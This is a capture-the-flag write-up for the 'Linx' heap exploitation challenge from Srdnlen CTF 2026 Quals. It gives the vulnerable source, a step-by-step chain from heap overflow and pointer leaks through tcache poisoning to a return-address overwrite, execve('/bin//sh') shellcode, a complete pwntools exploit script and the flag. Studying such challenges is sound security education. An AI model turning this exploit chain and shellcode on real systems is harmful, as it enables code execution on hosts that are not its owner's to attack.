---
title: "CTF Srdnlen CTF 2026 Quals - Linx [WRITE UP]"
tags:
    - Pwn
    - Heap
    - UAF
    - Tcache Poisoning
    - Heap Overflow
    - Ret2Shellcode
    - Execve
category: "CTF Time"
date: "2026-03-05 10:00:00"
---

This is a srdnlenCTF 2025 heap exploitation challenge. It chains a heap overflow, libc/heap leak, and tcache poisoning to redirect execution to a pre-placed shellcode.

# Pwn - Linx

## Introduction

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/Linx.png)

## Source Code

```sh
└─# tree Linx
Linx
├── Dockerfile
├── exploit.py
├── flag.txt
├── ld-linux-x86-64.so.2
├── libc.so.6
├── linx
├── linx_patched
└── linx.c

0 directories, 9 files
```

`linx.c`
```c
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>
#include <sys/mman.h>

#define LINKS_COUNT 30
#define LINKS_LEN 50

typedef struct {
    size_t src_idx, dst_idx;
} linkT;

char *links[LINKS_COUNT] = {0};
size_t links_cnt = 0;
linkT *linking = NULL;

regex_t re;
```

Key functions:

```c
void do_link() {
    char *src = calloc(1, LINKS_LEN);   // Only 50 bytes allocated
    char *dst = calloc(1, LINKS_LEN);
    for (size_t i = 1; i < re.re_nsub+1; i++) {
        size_t len = m[i].rm_eo - m[i].rm_so;
        if (i == 1)
            memcpy(src, text+m[i].rm_so, len);  // No bounds check -> heap overflow!
        else if (i == 2)
            memcpy(dst, text+m[i].rm_so, len);
    }
    linking = realloc(linking, ++links_cnt*sizeof(linkT));
    linking[links_cnt-1] = (linkT){.src_idx = src_idx, .dst_idx = dst_idx};
}

void do_unlink() {
    for (size_t i = 0; i < links_cnt; ) {
        bool is_dst = !strcmp(links[linking[i].dst_idx], text);
        bool is_src = !strcmp(links[linking[i].src_idx], text);
        if (is_src || is_dst) {
            memmove(linking+i, linking+i+1, (links_cnt-i-1)*sizeof(linkT));
            linking = realloc(linking, --links_cnt*sizeof(linkT));
        } else i++;
    }
    free(links[link_idx]);
    links[link_idx] = NULL;
}

void show_links() {
    puts("Here are all the links you inserted:");
    for (size_t i = 0; i < links_cnt; i++) {
        char *src = links[linking[i].src_idx];
        char *dst = links[linking[i].dst_idx];
        printf("\t\"%s\" -> \"%s\"\n", src, dst);  // Prints until null -> leak!
    }
    puts("End of links");
}

int main() {
    void *mem = mmap((void*)0x1337000ULL, 0x1000,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) exit(EXIT_FAILURE);
    puts("Welcome, provide me with your linking sauce:");
    if (fgets(mem, 0x20, stdin) == NULL) exit(EXIT_FAILURE);
    printf("Here's where I put your sauce: %p\n", mem);
    // ... menu loop
}
```

Checksec output:
```
[*] '/app/linx'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

## Summary

Insert link 14 times then `unlink link` and use `heap overflow` to leak libc and heap. After that use `unlink link` and `heap overflow` again to create state of tcache poisoning to leak the `stack` address via environ. Lastly just overwrite the return with shellcode address.

## Solution

The program is a markdown-style link manager. Before the menu loop, `main()` maps a fixed **RWX page at `0x1337000`** and reads up to 32 bytes of user input into it this becomes our **shellcode**.

There are two vulnerabilities:
1. **Heap overflow in `do_link()`** — each link's `src`/`dst` buffer is only `LINKS_LEN = 50` bytes, but `memcpy` copies the full regex-matched group length with no bounds check. A long string corrupts adjacent heap metadata.
2. **Out-of-bounds read in `show_links()`** — `printf` with `%s` stops at a null byte, not at the allocation boundary. When we overflow one chunk into the next, the overflowed region's heap/libc pointers are printed along with the string.

Some to be noticed on `do_link` regex doesn't allow us to input null byte and the calloc using the `tcache`.

First we send the input shellcode later to be used into the RWX mmap at `0x1337000`. Here send a small `execve("/bin//sh")` shellcode, also putting nop sled to bypass null byte at the address:

```python
sla("linking sauce:\n",
    b"\x90\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
```

Annotated assembly:
```nasm
nop
xor    rsi, rsi
push   rsi
mov    rdi, 0x68732f2f6e69622f   ; "/bin//sh"
push   rdi
push   rsp
pop    rdi
push   0x3b
pop    rax
cdq
syscall                           ; execve("/bin//sh", 0, 0)
```

Next insert 14 links (`S00`→`D00` … `S13`→`D13`). Each call allocates two `0x40`-size tcache chunks for the src and dst strings and grows the `linking` array via `realloc`.

```python
for i in range(14):
    insert_link(f"S{i:02d}".encode(), f"D{i:02d}".encode())
```

After that find a good target for the heap overflow.

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapState.png)

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapState2.png)

Here i choose where is the highest `fastbin` so it will be last used corrupted when move to the `smallbin`. Then we free `S04` and `S06`:

```python
unlink_link(b"S04")
unlink_link(b"S06")
```

`do_unlink()` calls `free(links[link_idx])`, putting both into the tcache `0x40` bin. Their forward pointer now holds a **mangled heap pointer**, and a neighboring previously-freed smallbin-bin chunk holds a **libc `main_arena` pointer**.

We trigger the overflow by inserting a src longer than 50 bytes:

```python
insert_link(b"A"*0x81, b"C"*0x40)
```

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapStateAfter.png)

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapState2After.png)

`show_links()` then prints past the allocation boundary, leaking the libc and heap pointers:

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/MenuResult.png)

```python
ru("A"*0x81)
libc_leak = uu64(ru('"')) << 8        # libc pointer (low byte missing → shift)
libc.address = libc_leak - 0x234c00
ru("C"*0x40)
heap_addr = demangle(uu64(ru('"')))   # safe-linked pointer → demangle
```

`demangle()` reverses safe-linking mangling (`ptr >> 12 XOR next`):

```python
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
```

With libc and heap base known, we compute `libc.environ` — a libc variable holding a copy of the process's `environ` pointer, which points into the **stack**.

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapState3.png)

We target and free using unlink to fill 4 the tcache free list, then overflow with insert link to overwrite the top free chunk's `fd` pointer with a mangled pointer to `libc.environ - 0x38`:

```python
unlink_link(b"S08") # Can be any 0x40 
unlink_link(b"S09") # Victim
unlink_link(b"S00") # Can be any 0x40
unlink_link(b"S07") # Used for overflow
insert_link(b"Z"*0x80 + p64(mangle(heap_addr, libc.sym["environ"] - 0x38))[:-2], b"Chill")
insert_link(b"Y", b"C"*0x38)
ru("C"*0x38)
stack_leak = uu64(ru('"'))
```

`mangle()` applies safe-linking:

```python
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val
```

The second `insert_link` allocates at `libc.environ - 0x38`. `show_links()` then reads past 0x38 bytes of padding and prints `environ` itself, giving a **stack address**.

![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/HeapState3After.png)

With a known stack address we compute where `main()`'s saved return address lives (`stack_leak - 0x158`). We repeat the tcache-poison pattern, this time targeting the stack:

```python
unlink_link(b"S13"); unlink_link(b"S12")
unlink_link(b"S02"); unlink_link(b"S11")

insert_link(b"D"*0xa0 + p64(mangle(heap_addr, stack_leak - 0x158))[:-2], b"ll")
insert_link(b"S", b"c"*8 + p32(0x1337001))
```

The second `insert_link` allocates **on the stack** and writes `0x1337001` directly over the saved `rip` — one byte past our shellcode's `nop` prefix.


![alt](/img/CTFTime/Srdnlen_CTF_2026_Quals/Solve.png)

### Solve Script

`exploit.py`
```python
#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
import traceback
import re
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'linx_patched')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]

gdbscript = '''
init-pwndbg
dprintf malloc, "malloc(%zu)\\n", $rdi
dprintf free, "free(%p)\\n", $rdi
# b *read_int+83
# b *do_link+1568
c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    update_checksec() 
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1092)
        sleep(1)
        return p
    elif args.REMOTE:
        context.log_level = 'debug'
        host, port = ("linx.challs.srdnlen.it", 1092) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=False)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid, g
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            pid = process(["pgrep", "-fx", "/app/linx"]).recvall().strip().decode()
            gdb_pid, g = gdb.attach(int(pid), api=True, gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe=exe.strip("_patched"))
            g.execute("directory /proc/{}/root/app".format(pid))
        else:
            gdb_pid, g = gdb.attach(io, api=True, gdbscript=gdbscript)
            g.execute("directory /mnt/c/Users/ASUS/Documents/Linx")

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute(["checksec", "--file", exe])
            commented = "".join(("# " + line + "\n") if line.strip() else "#\n" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data=None     : u32((io.recvline().strip() if not data else data).ljust(4, b"\x00"))
uu64    = lambda data=None     : u64((io.recvline().strip() if not data else data).ljust(8, b"\x00"))
info    = lambda name,addr          :log.info('{}: {}'.format(name, addr))
success    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
# [*] '/mnt/c/Users/ASUS/Documents/Linx/linx'
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No
#     Debuginfo:  Yes

# =========================================================
#                         EXPLOITS
# =========================================================
def menu(choice):
    """Select a menu option (1..4)."""
    sla(">> ", se(choice))

def insert_link(src, dst):
    """Insert a new link with given src and dst strings."""
    link = f"[{src}]({dst})"
    menu(1)
    sla("Insert your link", b"[" + src + b"](" + dst + b")")

def unlink_link(link_string):
    """Unlink the exact link string previously added (full string match)."""
    menu(2)
    sla("Insert your link to be unlinked", link_string)

def show_links_and_get():
    """Show links and return the block of output up to the end marker."""
    menu(3)

def quit_menu():
    """Exit the program via menu."""
    menu(4)

def solve_hashcash():
    """Solve the socaz PoW prompt and submit a valid stamp."""
    banner = io.recvuntil(b"Result: ", timeout=5)
    if not banner:
        return

    match = re.search(rb'Do Hashcash for (\d+) bits with resource "([^"]+)"', banner)
    if match is None:
        io.unrecv(banner)
        return

    bits = int(match.group(1))
    resource = match.group(2).decode()
    stamp = execute(["hashcash", f"-mCb{bits}", resource]).strip()
    info("Hashcash bits", bits)
    info("Hashcash resource", resource)
    success("Hashcash stamp", stamp)
    sl(stamp.encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit(x):
    global io
    io = initialize()
    if args.DOCKER or args.REMOTE or use_ip():
        solve_hashcash()
    debug()
    sla("linking sauce:\n", b"\x90\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
    with log.progress("Leaking libc & heap address"), context.silent:
        for i in range(14):
            insert_link(f"S{i:02d}".encode(), f"D{i:02d}".encode())
        unlink_link(b"S04")
        unlink_link(b"S06")
        insert_link(b"A"*0x81, b"C"*0x40)
        ru("A"*0x81)
        libc_leak = uu64(ru('"')) << 8
        libc.address = libc_leak - 0x234c00
        ru("C"*0x40)
        heap_addr = demangle(uu64(ru('"')))
    info("Heap address", hex(heap_addr))
    info("Libc address", hex(libc_leak))

    with log.progress("Tcache poisoning to before environ to leak stack"), context.silent:
        unlink_link(b"S08")
        unlink_link(b"S09")
        unlink_link(b"S00")
        unlink_link(b"S07")
        insert_link(b"Z"*0x80 + p64(mangle(heap_addr, libc.sym["environ"] - 0x38))[:-2], b"Chill")
        insert_link(b"Y", b"C"*0x38)
        ru("C"*0x38)
        stack_leak = uu64(ru('"'))
    info("Environ address", hex(libc.sym["environ"]))

    with log.progress("Overwrite the ret"), context.silent:
        unlink_link(b"S13")
        unlink_link(b"S12")
        unlink_link(b"S02")
        unlink_link(b"S11")
        insert_link(b"D"*0xa0 + p64(mangle(heap_addr, stack_leak - 0x158))[:-2], b"ll")        
        insert_link(b"S", b"c"*8 + p32(0x1337001))
    
    info("ELF base address", hex(elf.address)) if elf.address else None
    info("Libc base address", hex(libc.address)) if libc.address else None
    io.interactive() if not args.NOINTERACT else None

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            sys.stderr.write(traceback.format_exc())
        io.close()
```

### Flag

`srdnlen{y0u_ve_l1nk3d_v3ry_h4rd}`
